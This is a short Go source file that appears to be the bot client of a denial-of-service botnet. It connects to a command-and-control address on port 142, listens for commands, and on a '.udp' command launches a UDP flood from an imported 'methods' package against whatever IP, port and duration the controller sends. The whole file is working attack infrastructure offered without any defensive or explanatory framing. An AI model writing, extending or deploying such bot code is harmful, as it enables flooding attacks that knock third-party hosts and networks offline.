package main

import (
	"bufio"
	"gnet/methods"
	"net"
	"strconv"
	"strings"
)

var (
	IP       = "localhost"
	BOT_PORT = "142"
)

func main() {

	BotReceiver, _ := net.Dial("tcp", net.JoinHostPort(IP, BOT_PORT))
	BotScanner := bufio.NewScanner(BotReceiver)

	for BotScanner.Scan() {
		if BotScanner.Text() != "" || BotScanner.Text() != " " {
			HandlerCommand(BotScanner.Text())
		}
	}

}

func HandlerCommand(Command string) {

	if len(strings.Split(Command, " ")) == 4 {
		if strings.Split(Command, " ")[0] == ".udp" {
			IP := strings.Split(Command, " ")[1]
			PORT := strings.Split(Command, " ")[2]
			SECONDS, _ := strconv.Atoi(strings.Split(Command, " ")[3])
			methods.UdpFlood(IP, PORT, int(SECONDS))
		}
	}

}
